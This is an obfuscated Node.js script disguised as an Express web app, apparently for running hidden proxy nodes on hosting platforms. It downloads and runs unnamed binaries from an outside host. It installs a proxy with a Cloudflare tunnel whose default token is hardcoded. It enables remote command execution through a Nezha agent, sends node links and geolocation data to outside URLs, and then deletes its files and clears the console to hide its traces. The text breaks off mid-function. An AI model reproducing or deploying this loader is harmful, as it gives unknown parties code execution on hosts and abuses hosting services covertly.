const _0x6584bd=_0x105f;(function(_0x4e50e7,_0x11065f){const _0x4c81ad=_0x105f,_0x453902=_0x4e50e7();while(!![]){try{const _0x261fae=parseInt(_0x4c81ad(0x1b3))/0x1*(parseInt(_0x4c81ad(0x1fd))/0x2)+-parseInt(_0x4c81ad(0x1d0))/0x3+-parseInt(_0x4c81ad(0x23b))/0x4*(parseInt(_0x4c81ad(0x1da))/0x5)+-parseInt(_0x4c81ad(0x1b9))/0x6+parseInt(_0x4c81ad(0x200))/0x7*(parseInt(_0x4c81ad(0x1ff))/0x8)+parseInt(_0x4c81ad(0x266))/0x9+parseInt(_0x4c81ad(0x1af))/0xa;if(_0x261fae===_0x11065f)break;else _0x453902['push'](_0x453902['shift']());}catch(_0x3baec9){_0x453902['push'](_0x453902['shift']());}}}(_0x2868,0x85fd5));const express=require('express'),app=express(),axios=require(_0x6584bd(0x24d)),os=require('os'),fs=require('fs'),path=require(_0x6584bd(0x1ea)),{promisify}=require(_0x6584bd(0x240)),exec=promisify(require(_0x6584bd(0x25c))[_0x6584bd(0x1f5)]),UPLOAD_URL=process[_0x6584bd(0x26d)][_0x6584bd(0x21b)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x6584bd(0x26d)][_0x6584bd(0x22f)]||![],FILE_PATH=process[_0x6584bd(0x26d)][_0x6584bd(0x20f)]||_0x6584bd(0x209),SUB_PATH=process['env'][_0x6584bd(0x1c0)]||'sub',PORT=process[_0x6584bd(0x26d)]['SERVER_PORT']||process['env'][_0x6584bd(0x235)]||0xbb8,UUID=process[_0x6584bd(0x26d)][_0x6584bd(0x21f)]||_0x6584bd(0x1a3),NEZHA_SERVER=process[_0x6584bd(0x26d)][_0x6584bd(0x224)]||'',NEZHA_PORT=process[_0x6584bd(0x26d)][_0x6584bd(0x1d7)]||'',NEZHA_KEY=process[_0x6584bd(0x26d)][_0x6584bd(0x236)]||'',ARGO_DOMAIN=process[_0x6584bd(0x26d)][_0x6584bd(0x204)]||_0x6584bd(0x23f),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x6584bd(0x219),ARGO_PORT=process['env'][_0x6584bd(0x207)]||0x1f41,CFIP=process['env']['CFIP']||_0x6584bd(0x1f2),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process['env']['NAME']||_0x6584bd(0x253);!fs[_0x6584bd(0x1ce)](FILE_PATH)?(fs[_0x6584bd(0x1f7)](FILE_PATH),console[_0x6584bd(0x22b)](FILE_PATH+_0x6584bd(0x226))):console[_0x6584bd(0x22b)](FILE_PATH+_0x6584bd(0x1e6));function _0x105f(_0x1b417a,_0x2f6938){_0x1b417a=_0x1b417a-0x1a0;const _0x286825=_0x2868();let _0x105f8f=_0x286825[_0x1b417a];return _0x105f8f;}function generateRandomName(){const _0xf6c07d=_0x6584bd,_0x5c7bd8=_0xf6c07d(0x229);let _0x105628='';for(let _0x32347e=0x0;_0x32347e<0x6;_0x32347e++){_0x105628+=_0x5c7bd8[_0xf6c07d(0x1ba)](Math[_0xf6c07d(0x1fc)](Math[_0xf6c07d(0x1c8)]()*_0x5c7bd8[_0xf6c07d(0x1ed)]));}return _0x105628;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x6584bd(0x1fe)](FILE_PATH,npmName),phpPath=path[_0x6584bd(0x1fe)](FILE_PATH,phpName),webPath=path[_0x6584bd(0x1fe)](FILE_PATH,webName),botPath=path[_0x6584bd(0x1fe)](FILE_PATH,botName),subPath=path[_0x6584bd(0x1fe)](FILE_PATH,'sub.txt'),listPath=path[_0x6584bd(0x1fe)](FILE_PATH,_0x6584bd(0x248)),bootLogPath=path[_0x6584bd(0x1fe)](FILE_PATH,_0x6584bd(0x1d8)),configPath=path[_0x6584bd(0x1fe)](FILE_PATH,_0x6584bd(0x238));function deleteNodes(){const _0x111798=_0x6584bd;try{if(!UPLOAD_URL)return;if(!fs[_0x111798(0x1ce)](subPath))return;let _0x52361a;try{_0x52361a=fs['readFileSync'](subPath,_0x111798(0x25e));}catch{return null;}const _0x575bf9=Buffer[_0x111798(0x20b)](_0x52361a,_0x111798(0x242))['toString'](_0x111798(0x25e)),_0x9b1c1=_0x575bf9[_0x111798(0x1f8)]('\x0a')[_0x111798(0x23a)](_0x1cac03=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x111798(0x1c2)](_0x1cac03));if(_0x9b1c1[_0x111798(0x1ed)]===0x0)return;return axios[_0x111798(0x206)](UPLOAD_URL+_0x111798(0x24a),JSON[_0x111798(0x1eb)]({'nodes':_0x9b1c1}),{'headers':{'Content-Type':_0x111798(0x1e2)}})[_0x111798(0x263)](_0x56094f=>{return null;}),null;}catch(_0x2811c4){return null;}}function cleanupOldFiles(){const _0x27abe2=_0x6584bd;try{const _0x4f8d31=fs[_0x27abe2(0x218)](FILE_PATH);_0x4f8d31[_0x27abe2(0x1d5)](_0x3c58dd=>{const _0x46d93d=_0x27abe2,_0x553644=path[_0x46d93d(0x1fe)](FILE_PATH,_0x3c58dd);try{const _0x18f04f=fs[_0x46d93d(0x1a1)](_0x553644);_0x18f04f[_0x46d93d(0x1ec)]()&&fs[_0x46d93d(0x26a)](_0x553644);}catch(_0x463b20){}});}catch(_0x145e5e){}}async function generateConfig(){const _0x49203d=_0x6584bd,_0x461654={'log':{'access':_0x49203d(0x22a),'error':'/dev/null','loglevel':_0x49203d(0x260)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x49203d(0x214),'settings':{'clients':[{'id':UUID,'flow':_0x49203d(0x1a0)}],'decryption':_0x49203d(0x260),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x49203d(0x20c),'dest':0xbbb},{'path':_0x49203d(0x202),'dest':0xbbc}]},'streamSettings':{'network':_0x49203d(0x227)}},{'port':0xbb9,'listen':_0x49203d(0x203),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x49203d(0x260)},'streamSettings':{'network':'tcp','security':_0x49203d(0x260)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x49203d(0x1e1)}},'sniffing':{'enabled':!![],'destOverride':[_0x49203d(0x215),_0x49203d(0x217),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x49203d(0x203),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x49203d(0x20c)}},'sniffing':{'enabled':!![],'destOverride':[_0x49203d(0x215),_0x49203d(0x217),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x49203d(0x261),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x49203d(0x260),'wsSettings':{'path':_0x49203d(0x202)}},'sniffing':{'enabled':!![],'destOverride':[_0x49203d(0x215),_0x49203d(0x217),_0x49203d(0x1c6)],'metadataOnly':![]}}],'dns':{'servers':[_0x49203d(0x24c)]},'outbounds':[{'protocol':_0x49203d(0x24b),'tag':_0x49203d(0x1fb)},{'protocol':_0x49203d(0x20e),'tag':_0x49203d(0x1bf)}]};fs[_0x49203d(0x24e)](path['join'](FILE_PATH,_0x49203d(0x238)),JSON[_0x49203d(0x1eb)](_0x461654,null,0x2));}function getSystemArchitecture(){const _0x10f18f=_0x6584bd,_0x4f29f7=os[_0x10f18f(0x1c7)]();return _0x4f29f7===_0x10f18f(0x1f1)||_0x4f29f7===_0x10f18f(0x1df)||_0x4f29f7===_0x10f18f(0x20a)?_0x10f18f(0x1f1):_0x10f18f(0x1b7);}function downloadFile(_0x49c0d7,_0x3fd350,_0x1ee05f){const _0x9048f2=_0x6584bd,_0x412e60=_0x49c0d7;!fs[_0x9048f2(0x1ce)](FILE_PATH)&&fs[_0x9048f2(0x1f7)](FILE_PATH,{'recursive':!![]});const _0x5443e9=fs['createWriteStream'](_0x412e60);axios({'method':_0x9048f2(0x1b0),'url':_0x3fd350,'responseType':'stream'})[_0x9048f2(0x26e)](_0xd425be=>{const _0x372972=_0x9048f2;_0xd425be[_0x372972(0x21a)][_0x372972(0x216)](_0x5443e9),_0x5443e9['on'](_0x372972(0x210),()=>{const _0x2bda98=_0x372972;_0x5443e9['close'](),console[_0x2bda98(0x22b)](_0x2bda98(0x233)+path[_0x2bda98(0x1a4)](_0x412e60)+_0x2bda98(0x25b)),_0x1ee05f(null,_0x412e60);}),_0x5443e9['on']('error',_0x22a680=>{const _0x147f63=_0x372972;fs[_0x147f63(0x25a)](_0x412e60,()=>{});const _0x4b2008='Download\x20'+path[_0x147f63(0x1a4)](_0x412e60)+_0x147f63(0x239)+_0x22a680['message'];console[_0x147f63(0x1e9)](_0x4b2008),_0x1ee05f(_0x4b2008);});})[_0x9048f2(0x263)](_0x29f0ce=>{const _0x4b41f0=_0x9048f2,_0x3466dd=_0x4b41f0(0x233)+path['basename'](_0x412e60)+_0x4b41f0(0x239)+_0x29f0ce[_0x4b41f0(0x1a9)];console['error'](_0x3466dd),_0x1ee05f(_0x3466dd);});}async function downloadFilesAndRun(){const _0x23bca6=_0x6584bd,_0xf6d7f1=getSystemArchitecture(),_0x45fd38=getFilesForArchitecture(_0xf6d7f1);if(_0x45fd38[_0x23bca6(0x1ed)]===0x0){console['log'](_0x23bca6(0x1c5));return;}const _0x110193=_0x45fd38[_0x23bca6(0x1d1)](_0x679ef5=>{return new Promise((_0x68536f,_0x2ee56c)=>{const _0x11ab26=_0x105f;downloadFile(_0x679ef5[_0x11ab26(0x1fa)],_0x679ef5[_0x11ab26(0x1e5)],(_0x3dd4cc,_0x49ddf1)=>{_0x3dd4cc?_0x2ee56c(_0x3dd4cc):_0x68536f(_0x49ddf1);});});});try{await Promise[_0x23bca6(0x1c9)](_0x110193);}catch(_0x43f7e8){console[_0x23bca6(0x1e9)]('Error\x20downloading\x20files:',_0x43f7e8);return;}function _0x1c4c77(_0x34e1e8){const _0x946092=0x1fd;_0x34e1e8['forEach'](_0x4c2a77=>{const _0x21294a=_0x105f;fs[_0x21294a(0x1ce)](_0x4c2a77)&&fs[_0x21294a(0x1c1)](_0x4c2a77,_0x946092,_0x5a1b02=>{const _0x52ae2e=_0x21294a;_0x5a1b02?console['error'](_0x52ae2e(0x20d)+_0x4c2a77+':\x20'+_0x5a1b02):console[_0x52ae2e(0x22b)](_0x52ae2e(0x1be)+_0x4c2a77+':\x20'+_0x946092[_0x52ae2e(0x24f)](0x8));});});}const _0x165fca=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1c4c77(_0x165fca);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x366ac7=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x23bca6(0x211)]():'',_0x312060=new Set([_0x23bca6(0x201),_0x23bca6(0x26c),_0x23bca6(0x1bb),'2087',_0x23bca6(0x1e8),'2053']),_0x3c8091=_0x312060[_0x23bca6(0x205)](_0x366ac7)?_0x23bca6(0x22e):'false',_0x39a3db=_0x23bca6(0x221)+NEZHA_KEY+_0x23bca6(0x1ae)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3c8091+_0x23bca6(0x1a8)+UUID;fs[_0x23bca6(0x24e)](path[_0x23bca6(0x1fe)](FILE_PATH,_0x23bca6(0x21c)),_0x39a3db);const _0x31267f=_0x23bca6(0x25d)+phpPath+_0x23bca6(0x1ef)+FILE_PATH+_0x23bca6(0x262);try{await exec(_0x31267f),console['log'](phpName+_0x23bca6(0x1e0)),await new Promise(_0x1a569c=>setTimeout(_0x1a569c,0x3e8));}catch(_0x335346){console[_0x23bca6(0x1e9)](_0x23bca6(0x264)+_0x335346);}}else{let _0x4f406b='';const _0x1f000c=[_0x23bca6(0x201),_0x23bca6(0x26c),_0x23bca6(0x1bb),_0x23bca6(0x1cb),_0x23bca6(0x1e8),_0x23bca6(0x256)];_0x1f000c[_0x23bca6(0x1dc)](NEZHA_PORT)&&(_0x4f406b=_0x23bca6(0x250));const _0x2032c6=_0x23bca6(0x25d)+npmPath+_0x23bca6(0x1f0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x23bca6(0x1a6)+NEZHA_KEY+'\x20'+_0x4f406b+_0x23bca6(0x251);try{await exec(_0x2032c6),console[_0x23bca6(0x22b)](npmName+_0x23bca6(0x1e0)),await new Promise(_0x3009f6=>setTimeout(_0x3009f6,0x3e8));}catch(_0x1cce2a){console[_0x23bca6(0x1e9)](_0x23bca6(0x270)+_0x1cce2a);}}}else console[_0x23bca6(0x22b)](_0x23bca6(0x1d2));const _0x116cb9=_0x23bca6(0x25d)+webPath+_0x23bca6(0x213)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x116cb9),console['log'](webName+_0x23bca6(0x1e0)),await new Promise(_0x2e62e1=>setTimeout(_0x2e62e1,0x3e8));}catch(_0x41a9e6){console[_0x23bca6(0x1e9)](_0x23bca6(0x23c)+_0x41a9e6);}if(fs['existsSync'](botPath)){let _0x529329;if(ARGO_AUTH[_0x23bca6(0x1d6)](/^[A-Z0-9a-z=]{120,250}$/))_0x529329='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x23bca6(0x1d6)](/TunnelSecret/)?_0x529329='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x23bca6(0x1e4):_0x529329=_0x23bca6(0x225)+FILE_PATH+_0x23bca6(0x1e3)+ARGO_PORT;try{await exec(_0x23bca6(0x25d)+botPath+'\x20'+_0x529329+_0x23bca6(0x1dd)),console['log'](botName+_0x23bca6(0x1e0)),await new Promise(_0x13fe15=>setTimeout(_0x13fe15,0x7d0));}catch(_0x5eee4f){console[_0x23bca6(0x1e9)](_0x23bca6(0x1d9)+_0x5eee4f);}}await new Promise(_0x2fac83=>setTimeout(_0x2fac83,0x1388));}function _0x2868(){const _0x466166=['chmod','test','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Subscription\x20uploaded\x20successfully','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','quic','arch','random','all','\x0a\x0atrojan://','2087','http://ip-api.com/json','&fp=firefox&type=ws&host=','existsSync','.exe\x20>\x20nul\x202>&1','3178107neLSXy','map','NEZHA\x20variable\x20is\x20empty,skip\x20running','Error\x20in\x20startserver:','/vmess-argo?ed=2560','forEach','match','NEZHA_PORT','boot.log','Error\x20executing\x20command:\x20','3995kgiNPd','ARGO_DOMAIN:','includes','\x20>/dev/null\x202>&1\x20&','status','arm64','\x20is\x20running','/vless-argo','application/json','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/tunnel.yml\x20run','fileUrl','\x20already\x20exists','org','2083','error','path','stringify','isFile','length','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','\x20-c\x20\x22','\x20-s\x20','arm','cdns.doon.eu.org','Content-Type','unshift','exec','set','mkdirSync','split','success','fileName','direct','floor','122lpLEFz','join','8DCDkfA','2988055xFWwDV','443','/trojan-argo','127.0.0.1','ARGO_DOMAIN','has','post','ARGO_PORT','send','.tmp','aarch64','from','/vmess-argo','Empowerment\x20failed\x20for\x20','blackhole','FILE_PATH','finish','pop','https://arm64.ssss.nyc.mn/v1','\x20-c\x20','vless','http','pipe','tls','readdirSync','eyJhIjoiZTM1N2NlMDRmYWVkODU2OWViOTFjZmRmMjZiZDBkZWQiLCJ0IjoiYmUzM2IwZDQtODNkNy00YWQwLWFlMjItOGM0MTI0NjRlYmU4IiwicyI6Ik5qZzVNVFExWlRZdE5qZzJNQzAwWVRJMkxXSTBZbU10T1dRNE5URTVPREZtWWpKaiJ9','data','UPLOAD_URL','config.yaml','country_code','\x20>/dev/null\x202>&1','UUID','taskkill\x20/f\x20/im\x20','\x0aclient_secret:\x20','readFile','/sub.txt\x20saved\x20successfully','NEZHA_SERVER','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20is\x20created','tcp','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','abcdefghijklmnopqrstuvwxyz','/dev/null','log','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x0avmess://','true','AUTO_ACCESS','Nodes\x20uploaded\x20successfully','del\x20/f\x20/q\x20','https://arm64.ssss.nyc.mn/agent','Download\x20','ArgoDomain:','PORT','NEZHA_KEY','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','config.json','\x20failed:\x20','filter','2636GqtutH','web\x20running\x20error:\x20','Unknown','https://oooo.serv00.net/add-url','sapus.bzfmq.dpdns.org','util','pkill\x20-f\x20\x22[','base64','https://ipapi.co/json','Skipping\x20adding\x20automatic\x20access\x20task','\x20>\x20nul\x202>&1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','http\x20server\x20is\x20running\x20on\x20port:','list.txt','?security=tls&sni=','/api/delete-nodes','freedom','https+local://8.8.8.8/dns-query','axios','writeFileSync','toString','--tls','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','push','Galaxy','text/plain;\x20charset=utf-8','utf8','2053','App\x20is\x20running','win32','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','unlink','\x20successfully','child_process','nohup\x20','utf-8','platform','none','trojan','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','catch','php\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/bot','9828882JNnImp','https://amd64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/v1','\x0a\x20\x20credentials-file:\x20','unlinkSync','automatic\x20access\x20task\x20added\x20successfully','8443','env','then','\x22\x20>\x20/dev/null\x202>&1','npm\x20running\x20error:\x20','xtls-rprx-vision','statSync','response','3affab23-debf-4d4b-9f74-33714645db7d','basename','index.html','\x20-p\x20','substring','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','message','countryCode','Add\x20automatic\x20access\x20task\x20faild:\x20','https://arm64.ssss.nyc.mn/bot','Unhandled\x20error\x20in\x20startserver:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','5663970fvadbt','get','tunnel.json','readFileSync','4861adiRZC','listen','\x0a\x20\x20tunnel:\x20','tunnel.yml','amd','&path=%2Fvless-argo%3Fed%3D2560#','1482900GeGBfY','charAt','2096','promises','&path=%2Ftrojan-argo%3Fed%3D2560#','Empowerment\x20success\x20for\x20','block','SUB_PATH'];_0x2868=function(){return _0x466166;};return _0x2868();}function getFilesForArchitecture(_0x281b0f){const _0x36f4e6=_0x6584bd;let _0x590bb3;_0x281b0f===_0x36f4e6(0x1f1)?_0x590bb3=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x36f4e6(0x1ac)}]:_0x590bb3=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x36f4e6(0x265)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x17a6ee=_0x281b0f===_0x36f4e6(0x1f1)?_0x36f4e6(0x232):_0x36f4e6(0x267);_0x590bb3['unshift']({'fileName':npmPath,'fileUrl':_0x17a6ee});}else{const _0x45eaa1=_0x281b0f===_0x36f4e6(0x1f1)?_0x36f4e6(0x212):_0x36f4e6(0x268);_0x590bb3[_0x36f4e6(0x1f4)]({'fileName':phpPath,'fileUrl':_0x45eaa1});}}return _0x590bb3;}function argoType(){const _0x46693a=_0x6584bd;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x46693a(0x22b)](_0x46693a(0x228));return;}if(ARGO_AUTH[_0x46693a(0x1dc)]('TunnelSecret')){fs['writeFileSync'](path[_0x46693a(0x1fe)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x47f591=_0x46693a(0x1b5)+ARGO_AUTH['split']('\x22')[0xb]+_0x46693a(0x269)+path['join'](FILE_PATH,_0x46693a(0x1b1))+_0x46693a(0x22c)+ARGO_DOMAIN+_0x46693a(0x1c3)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,_0x46693a(0x1b6)),_0x47f591);}else console[_0x46693a(0x22b)](_0x46693a(0x259));}async function extractDomains(){const _0x12858a=_0x6584bd;let _0x20999c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x20999c=ARGO_DOMAIN,console[_0x12858a(0x22b)](_0x12858a(0x1db),_0x20999c),await _0x245e93(_0x20999c);else try{const _0x5e3ea0=fs[_0x12858a(0x1b2)](path[_0x12858a(0x1fe)](FILE_PATH,_0x12858a(0x1d8)),'utf-8'),_0x278784=_0x5e3ea0[_0x12858a(0x1f8)]('\x0a'),_0x5a391f=[];_0x278784[_0x12858a(0x1d5)](_0x432122=>{const _0xc1b021=_0x12858a,_0x27e6d9=_0x432122[_0xc1b021(0x1d6)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x27e6d9){const _0x34988d=_0x27e6d9[0x1];_0x5a391f[_0xc1b021(0x252)](_0x34988d);}});if(_0x5a391f[_0x12858a(0x1ed)]>0x0)_0x20999c=_0x5a391f[0x0],console[_0x12858a(0x22b)](_0x12858a(0x234),_0x20999c),await _0x245e93(_0x20999c);else{console[_0x12858a(0x22b)](_0x12858a(0x246)),fs[_0x12858a(0x26a)](path[_0x12858a(0x1fe)](FILE_PATH,_0x12858a(0x1d8)));async function _0x3950e9(){const _0x53a44c=_0x12858a;try{process['platform']===_0x53a44c(0x258)?await exec(_0x53a44c(0x220)+botName+_0x53a44c(0x1cf)):await exec(_0x53a44c(0x241)+botName['charAt'](0x0)+']'+botName[_0x53a44c(0x1a7)](0x1)+_0x53a44c(0x26f));}catch(_0xd08175){}}_0x3950e9(),await new Promise(_0x283445=>setTimeout(_0x283445,0xbb8));const _0x2c51c8=_0x12858a(0x225)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x12858a(0x25d)+botPath+'\x20'+_0x2c51c8+'\x20>/dev/null\x202>&1\x20&'),console[_0x12858a(0x22b)](botName+_0x12858a(0x1e0)),await new Promise(_0x205664=>setTimeout(_0x205664,0xbb8)),await extractDomains();}catch(_0x4f7f77){console['error'](_0x12858a(0x1d9)+_0x4f7f77);}}}catch(_0x5ddae1){console['error']('Error\x20reading\x20boot.log:',_0x5ddae1);}async function _0x53874e(){const _0x258eea=_0x12858a;try{const _0x3d0eb0=await axios[_0x258eea(0x1b0)](_0x258eea(0x243),{'timeout':0xbb8});if(_0x3d0eb0[_0x258eea(0x21a)]&&_0x3d0eb0[_0x258eea(0x21a)][_0x258eea(0x21d)]&&_0x3d0eb0['data']['org'])return _0x3d0eb0[_0x258eea(0x21a)]['country_code']+'_'+_0x3d0eb0[_0x258eea(0x21a)][_0x258eea(0x1e7)];}catch(_0x5d245d){try{const _0x444cc6=await axios['get'](_0x258eea(0x1cc),{'timeout':0xbb8});if(_0x444cc6[_0x258eea(0x21a)]&&_0x444cc6[_0x258eea(0x21a)][_0x258eea(0x1de)]===_0x258eea(0x1f9)&&_0x444cc6[_0x258eea(0x21a)][_0x258eea(0x1aa)]&&_0x444cc6[_0x258eea(0x21a)][_0x258eea(0x1e7)])return _0x444cc6[_0x258eea(0x21a)][_0x258eea(0x1aa)]+'_'+_0x444cc6[_0x258eea(0x21a)]['org'];}catch(_0x5bad0){}}return _0x258eea(0x23d);}async function _0x245e93(_0x332b9a){const _0x3fb379=await _0x53874e(),_0x3298a2=NAME?NAME+'-'+_0x3fb379:_0x3fb379;return new Promise(_0xe7cfdb=>{setTimeout(()=>{const _0x5402df=_0x105f,_0x28e3c5={'v':'2','ps':''+_0x3298a2,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5402df(0x260),'net':'ws','type':_0x5402df(0x260),'host':_0x332b9a,'path':_0x5402df(0x1d4),'tls':_0x5402df(0x217),'sni':_0x332b9a,'alpn':'','fp':'firefox'},_0x2b05d5='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x332b9a+_0x5402df(0x1cd)+_0x332b9a+_0x5402df(0x1b8)+_0x3298a2+_0x5402df(0x22d)+Buffer['from'](JSON[_0x5402df(0x1eb)](_0x28e3c5))['toString'](_0x5402df(0x242))+_0x5402df(0x1ca)+UUID+'@'+CFIP+':'+CFPORT+_0x5402df(0x249)+_0x332b9a+_0x5402df(0x1cd)+_0x332b9a+_0x5402df(0x1bd)+_0x3298a2+'\x0a\x20\x20\x20\x20';console[_0x5402df(0x22b)](Buffer[_0x5402df(0x20b)](_0x2b05d5)[_0x5402df(0x24f)](_0x5402df(0x242))),fs[_0x5402df(0x24e)](subPath,Buffer['from'](_0x2b05d5)[_0x5402df(0x24f)](_0x5402df(0x242))),console['log'](FILE_PATH+_0x5402df(0x223)),uploadNodes(),app[_0x5402df(0x1b0)]('/'+SUB_PATH,(_0x4d54db,_0x5789d7)=>{const _0x268cfa=_0x5402df,_0x21bd5b=Buffer[_0x268cfa(0x20b)](_0x2b05d5)[_0x268cfa(0x24f)](_0x268cfa(0x242));_0x5789d7[_0x268cfa(0x1f6)](_0x268cfa(0x1f3),_0x268cfa(0x254)),_0x5789d7[_0x268cfa(0x208)](_0x21bd5b);}),_0xe7cfdb(_0x2b05d5);},0x7d0);});}}async function uploadNodes(){const _0x33f78f=_0x6584bd;if(UPLOAD_URL&&PROJECT_URL){const _0x4490dd=PROJECT_URL+'/'+SUB_PATH,_0x3164c9={'subscription':[_0x4490dd]};try{const _0x4b060c=await axios[_0x33f78f(0x206)](UPLOAD_URL+'/api/add-subscriptions',_0x3164c9,{'headers':{'Content-Type':_0x33f78f(0x1e2)}});return _0x4b060c&&_0x4b060c[_0x33f78f(0x1de)]===0xc8?(console[_0x33f78f(0x22b)](_0x33f78f(0x1c4)),_0x4b060c):null;}catch(_0x3733af){if(_0x3733af['response']){if(_0x3733af[_0x33f78f(0x1a2)][_0x33f78f(0x1de)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x33f78f(0x1ce)](listPath))return;const _0x10e1b9=fs[_0x33f78f(0x1b2)](listPath,_0x33f78f(0x25e)),_0x1cffdc=_0x10e1b9['split']('\x0a')[_0x33f78f(0x23a)](_0x42c9c0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x42c9c0));if(_0x1cffdc[_0x33f78f(0x1ed)]===0x0)return;const _0x2675d3=JSON[_0x33f78f(0x1eb)]({'nodes':_0x1cffdc});try{const _0x3d41df=await axios[_0x33f78f(0x206)](UPLOAD_URL+'/api/add-nodes',_0x2675d3,{'headers':{'Content-Type':_0x33f78f(0x1e2)}});return _0x3d41df&&_0x3d41df[_0x33f78f(0x1de)]===0xc8?(console[_0x33f78f(0x22b)](_0x33f78f(0x230)),_0x3d41df):null;}catch(_0x33f093){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1ccf38=_0x105f,_0x1e3166=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1e3166[_0x1ccf38(0x252)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1e3166[_0x1ccf38(0x252)](phpPath);process[_0x1ccf38(0x25f)]===_0x1ccf38(0x258)?exec(_0x1ccf38(0x231)+_0x1e3166[_0x1ccf38(0x1fe)]('\x20')+_0x1ccf38(0x245),_0x407fcd=>{const _0x23d7e3=_0x1ccf38;console['clear'](),console['log']('App\x20is\x20running'),console[_0x23d7e3(0x22b)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x1e3166[_0x1ccf38(0x1fe)]('\x20')+_0x1ccf38(0x21e),_0x552593=>{const _0x3549f5=_0x1ccf38;console['clear'](),console[_0x3549f5(0x22b)](_0x3549f5(0x257)),console[_0x3549f5(0x22b)](_0x3549f5(0x237));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x15863e=_0x6584bd;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x15863e(0x22b)](_0x15863e(0x244));return;}try{const _0x24c172=await axios['post'](_0x15863e(0x23e),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x15863e(0x1e2)}});return console[_0x15863e(0x22b)](_0x15863e(0x26b)),_0x24c172;}catch(_0x52ef90){return console[_0x15863e(0x1e9)](_0x15863e(0x1ab)+_0x52ef90[_0x15863e(0x1a9)]),null;}}async function startserver(){const _0x2c14eb=_0x6584bd;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 